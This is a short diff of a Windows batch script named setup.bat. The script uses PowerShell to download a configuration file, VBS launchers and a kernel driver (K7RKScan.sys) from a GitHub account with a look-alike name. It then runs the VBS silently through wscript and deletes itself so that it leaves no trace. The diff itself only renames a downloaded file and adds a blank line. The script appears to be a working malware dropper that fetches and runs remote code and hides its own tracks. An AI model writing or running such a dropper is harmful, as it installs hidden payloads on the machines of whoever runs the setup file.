@@ -36,7 +36,7 @@ powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/ref
 powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml', 'Config.toml')"
 powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/ghost_launcher.vbs', 'launcher.vbs')"
 powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys', 'driver\k7RKScan.sys')"
-powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Loop/raw/refs/heads/main/Task.vbs', 'task.vbs')"
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Loop/raw/refs/heads/main/Task.vbs', 'Task.vbs')"
 
 :: ============================================================
 :: 4. THE SILENT HANDOFF
@@ -52,4 +52,5 @@ wscript.exe "%workDir%\task.vbs"
 :: 2. THE SELF-DESTRUCT (Must be the LAST line)
 :: This deletes the setup.bat you are currently running.
 (goto) 2>nul & del "%~f0"
+
 
